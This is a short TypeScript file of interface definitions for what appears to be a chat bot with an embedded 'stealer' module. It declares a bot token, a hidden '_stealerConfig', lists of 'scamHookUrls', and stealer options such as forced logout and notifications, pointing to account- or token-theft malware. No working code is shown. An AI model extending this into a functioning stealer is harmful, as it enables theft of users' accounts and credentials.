export interface Config {
    token: string,
    prefix: string,
    ignoreErrors: boolean,
    _stealerConfig: StealerConfig;
}

export interface WebhookConfig {
    scamHookUrls: string[];
    reportHookUrl: string;
}

export interface Rare<T = any> {
    data: T;
    rare: number;
}


export interface StealerConfig {
    stealerName: string;
    logout: string;
    "logout-notify": boolean;
    "init-notify": boolean;
    "embed-color": number;
    "disable-qr-code": boolean;
}
